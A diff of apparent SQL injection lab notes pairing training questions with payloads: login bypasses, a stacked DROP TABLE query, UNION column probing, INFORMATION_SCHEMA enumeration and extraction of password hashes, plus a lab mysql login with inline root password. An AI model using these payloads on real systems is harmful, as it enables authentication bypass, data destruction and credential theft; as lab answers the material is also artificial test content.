@@ -131,3 +131,32 @@ SELECT COUNT(*) FROM titles WHERE emp_no > 10000 OR title NOT LIKE '%engineer%';
 select * from logins where username like '%1'; DROP TABLE users;'
 Error: near line 1: near "'": syntax error
 select * from logins where username like '%1'; DROP TABLE users;'
+----------------
+"Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?"
+tom'; -- -
+tom' OR '1' = '1' -- -
+--------------------
+SELECT username FROM logins; -- Selects usernames from the logins table 
+Auth Bypass with comments
+SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
+------------------------------------
+' OR ID=5)-- -
+-------------------------------
+Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.
+mysql -h 46.101.61.42 -P 30658 -u root -ppassword
+USE employees;
+DESCRIBE employees;
+DESCRIBE departments;
+SELECT COUNT(*) FROM (SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments) Foo;
+SELECT * FROM employees UNION SELECT dept_no,dept_name,3,4,5,6 FROM departments;
+-----------------------------
+"Use a Union injection to get the result of 'user()'"
+' UNION SELECT 1-- -
+' UNION SELECT 1,2-- -
+' UNION SELECT 1,2,3-- -
+' UNION SELECT 1,2,3,4-- -
+' UNION SELECT 1,user(),3,4-- -
+-----------------------------
+"What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?"
+foo' UNION SELECT 1,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -
+foo' UNION SELECT 1,username,password,4 FROM ilfreight.users-- -
